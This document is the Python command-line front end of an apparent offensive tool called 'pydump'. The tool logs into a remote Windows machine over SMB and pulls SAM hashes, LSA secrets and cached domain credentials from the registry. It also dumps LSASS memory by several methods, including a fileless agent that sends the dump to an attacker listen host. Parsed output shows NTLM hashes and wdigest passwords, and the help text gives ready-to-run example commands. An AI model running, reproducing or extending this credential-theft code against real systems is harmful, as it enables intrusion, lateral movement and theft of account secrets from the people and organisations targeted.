"""Command-line interface for pydump."""

import argparse
import sys
import os

from .smb import SmbSession
from .dump.methods import ComSvcsDump, SilentDump, PipeDump
from .secrets.registry import RegistrySecrets
from .parser.minidump import parse
from .parser.extract import CredentialExtractor


def main():
    parser = argparse.ArgumentParser(
        prog="pydump",
        description="Remote credential extraction (registry + LSASS)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Full extraction: registry secrets + LSASS dump
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -d CORP

  # Registry only (no execution on target)
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --method registry

  # LSASS only (comsvcs method)
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --method comsvcs

  # Save LSASS dump to file
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp

  # Parse an existing dump file
  pydump parse -f lsass.dmp
""",
    )

    subparsers = parser.add_subparsers(dest="command")

    # ─── dump command ───────────────────────────────────────────────────────
    dump_parser = subparsers.add_parser("dump", help="Extract credentials from a remote target")
    dump_parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    dump_parser.add_argument("-u", "--username", required=True, help="Username")
    dump_parser.add_argument("-p", "--password", required=True, help="Password")
    dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
    dump_parser.add_argument(
        "-m", "--method",
        choices=["auto", "registry", "comsvcs", "silent", "pipe"],
        default="auto",
        help="Method: auto (registry+lsass), registry (no exec), comsvcs, silent, pipe (fileless agent)",
    )
    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
    dump_parser.add_argument("--lhost", default=None, help="Listen IP (silent/pipe methods)")
    dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
    dump_parser.add_argument("--agent", default=None, help="Path to agent.exe (pipe method)")
    dump_parser.add_argument("-o", "--output", default=None, help="Save raw LSASS dump to file")

    # ─── parse command ──────────────────────────────────────────────────────
    parse_parser = subparsers.add_parser("parse", help="Parse an existing minidump file")
    parse_parser.add_argument("-f", "--file", required=True, help="Path to .dmp file")

    args = parser.parse_args()

    if args.command == "dump":
        cmd_dump(args)
    elif args.command == "parse":
        cmd_parse(args)
    else:
        parser.print_help()
        sys.exit(1)


def cmd_dump(args):
    """Full credential extraction: registry + LSASS."""
    print(f"[*] Connecting to {args.target}...")

    with SmbSession(args.target, args.username, args.password, args.domain) as session:
        print(f"[+] Authenticated as {args.domain}\\{args.username}")

        do_registry = args.method in ("auto", "registry")
        do_lsass = args.method in ("auto", "comsvcs", "silent", "pipe")

        # ─── Registry secrets ───────────────────────────────────────────
        if do_registry:
            _dump_registry(session)

        # ─── LSASS dump ─────────────────────────────────────────────────
        if do_lsass:
            _dump_lsass(session, args)


def _dump_registry(session: SmbSession):
    """Extract secrets from remote registry."""
    print()
    print("── Registry Secrets ─────────────────────────────────────────")
    reg_secrets = RegistrySecrets(session)

    # Ensure service is running
    try:
        reg_secrets.ensure_remote_registry()
        print("[+] Remote Registry service ready")
    except RuntimeError as e:
        print(f"[!] Cannot start Remote Registry: {e}")
        return

    try:
        # SAM hashes
        try:
            hashes = reg_secrets.dump_sam()
            if hashes:
                print(f"[+] SAM hashes ({len(hashes)}):")
                for h in hashes:
                    print(f"    {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
            else:
                print("[-] No SAM hashes found")
        except RuntimeError as e:
            print(f"[!] SAM extraction failed: {e}")

        # LSA Secrets
        try:
            secrets = reg_secrets.dump_lsa_secrets()
            if secrets:
                print(f"[+] LSA Secrets ({len(secrets)}):")
                for s in secrets:
                    print(f"    {s.name}: {s.decoded}")
            else:
                print("[-] No LSA secrets found")
        except RuntimeError as e:
            print(f"[!] LSA secrets failed: {e}")

        # Cached creds
        try:
            cached = reg_secrets.dump_cached_creds()
            if cached:
                print(f"[+] Cached credentials ({len(cached)}):")
                for c in cached:
                    print(f"    {c.domain}\\{c.username}:{c.hash_hex}")
            else:
                print("[-] No cached credentials")
        except RuntimeError as e:
            print(f"[!] Cached creds failed: {e}")
    finally:
        reg_secrets.cleanup_remote_registry()
        print("[*] Remote Registry service restored")


def _dump_lsass(session: SmbSession, args):
    """Dump LSASS memory and extract credentials."""
    print()
    print("── LSASS Memory ─────────────────────────────────────────────")

    method_name = args.method if args.method not in ("auto", "registry") else "pipe"

    if method_name == "pipe":
        if not args.lhost:
            print("[!] --lhost required for pipe method")
            return
        agent_path = args.agent or "agent/bin/agent.exe"
        method = PipeDump(session, args.lhost, agent_path)
    elif method_name == "comsvcs":
        method = ComSvcsDump(session)
    elif method_name == "silent":
        if not args.lhost:
            print("[!] --lhost required for silent method")
            return
        method = SilentDump(session)
    else:
        method = ComSvcsDump(session)

    print(f"[*] Method: {method_name}")

    try:
        if method_name == "silent":
            dump_data = method.execute(lsass_pid=args.pid, listen_port=args.lport)
        else:
            dump_data = method.execute(lsass_pid=args.pid)
    except RuntimeError as e:
        print(f"[!] LSASS dump failed: {e}")
        print("    (Target may have ASR rules blocking process execution)")
        return

    print(f"[+] Received {len(dump_data)} bytes")

    if args.output:
        with open(args.output, "wb") as f:
            f.write(dump_data)
        print(f"[+] Saved to {args.output}")

    _parse_and_display(dump_data)


def cmd_parse(args):
    """Parse a local dump file."""
    if not os.path.isfile(args.file):
        print(f"[!] File not found: {args.file}")
        sys.exit(1)

    with open(args.file, "rb") as f:
        dump_data = f.read()

    print(f"[*] Parsing {args.file} ({len(dump_data)} bytes)")
    _parse_and_display(dump_data)


def _parse_and_display(dump_data: bytes):
    """Parse dump and display extracted credentials."""
    print("[*] Parsing minidump...")
    dump = parse(dump_data)

    print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")
    print(f"    Modules: {len(dump.modules)}")
    print(f"    Memory segments: {len(dump.memory)}")
    print()

    print("[*] Extracting credentials...")
    extractor = CredentialExtractor(dump)

    try:
        credentials = extractor.extract()
    except RuntimeError as e:
        print(f"[!] {e}")
        return

    if not credentials:
        print("[-] No credentials found")
        return

    print(f"[+] Found {len(credentials)} credential(s):\n")
    print(f"{'Auth':<10} {'Domain':<20} {'Username':<25} {'Secret'}")
    print("-" * 90)

    for cred in credentials:
        if cred.auth_type == "msv1_0":
            secret = cred.ntlm_hash if cred.ntlm_hash else "(empty)"
        elif cred.auth_type == "wdigest":
            secret = cred.password if cred.password else "(empty)"
        else:
            secret = "(see above)"

        print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")
